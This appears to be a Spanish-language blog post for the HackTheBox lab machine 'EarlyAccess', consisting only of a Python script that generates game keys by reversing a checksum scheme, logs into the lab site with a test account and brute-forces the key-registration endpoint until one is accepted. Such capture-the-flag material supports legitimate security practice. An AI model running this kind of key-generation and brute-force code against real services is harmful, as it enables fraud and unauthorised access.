---
layout: post
title: HackTheBox-EarlyAccess
description: Resolucion de la maquina EarlyAccess de HackTheBox
date: 2026-01-10 20:24:59 -500
categories: [Hard]
tags: [CSRF]
home_image: logo
logo:
  path: /assets/writeups/EarlyAccess.png
  alt: "EarlyAccess"
---

```python
from itertools import product
from pwn import *
import string, pdb, requests, signal, sys, time, urllib3, re

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Calculate G3 Pair
def calc_g3():
    p1 = product(string.ascii_uppercase, repeat=2)
    p1 = ["".join(i) for i in p1]

    uniques = {}

    for i in p1:
        for j in range(0, 10):
            cadena = f"XP{i}{j}"
            value = sum(bytearray(cadena.encode()))
            uniques[value] = cadena

    return uniques.values()

# Checksum
def calc_cs(key) -> int:
    gs = key.split("-")[:-1]
    return sum([sum(bytearray(g.encode())) for g in gs])

def keyGen():
    values = calc_g3()
    total_keys = []

    for key in values:
        key = f"KEY67-AYBZ0-{key}-GAMC7-"
        cs = calc_cs(key)
        final_key = key + str(cs)
        total_keys.append(final_key)

    return total_keys

def tryKey(keys):

    login_url = "https://earlyaccess.htb/login"
    key_url = "https://earlyaccess.htb/key"
    key_add_url = "https://earlyaccess.htb/key/add"

    urllib3.disable_warnings()
    s = requests.session()
    s.verify = False

    r = s.get(login_url)
    token = re.findall(r'name="_token" value="(.*?)"', r.text)[0]

    data_post = {
        '_token': token,
        'email': 'romel@romel.com',
        'password': 'romel123xd'
    }

    r = s.post(login_url, data=data_post)

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    counter = 1

    for key in keys:

        p1.status("Probando con la key %s [%d/60]" % (key, counter))
        
        r = s.get(key_url)
        token = re.findall(r'name="_token" value="(.*?)"', r.text)[0]

        post_data = {
            '_token': token,
            'key': key
        }

        r = s.post(key_add_url, data=post_data)

        if "Game-key is invalid!" not in r.text:
            p1.success("La KEY %s es válida y ha sido aceptada" % key)
            sys.exit(0)

        counter += 1

if __name__ == "__main__":
    keys = keyGen()
    tryKey(keys)
```

